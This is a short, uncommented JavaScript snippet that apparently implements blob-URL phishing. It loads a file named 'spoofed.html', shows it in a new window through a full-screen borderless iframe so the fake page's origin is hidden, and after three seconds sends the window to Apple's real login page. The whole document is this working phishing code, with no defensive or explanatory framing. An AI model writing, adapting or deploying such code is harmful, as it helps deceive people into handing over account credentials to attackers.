fetch("spoofed.html")
  .then(res => res.text())
  .then(html => {
    const blob = new Blob([html], { type: "text/html" });
    const blobURL = URL.createObjectURL(blob);
    const w = window.open();
    const htmlFrame = `
      <iframe src="${blobURL}" style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;"></iframe>
      <script>
        setTimeout(() => location.replace("https://apple.com/login"), 3000);
      <\/script>
    `;
    w.document.write(htmlFrame);
    w.document.close();
  });
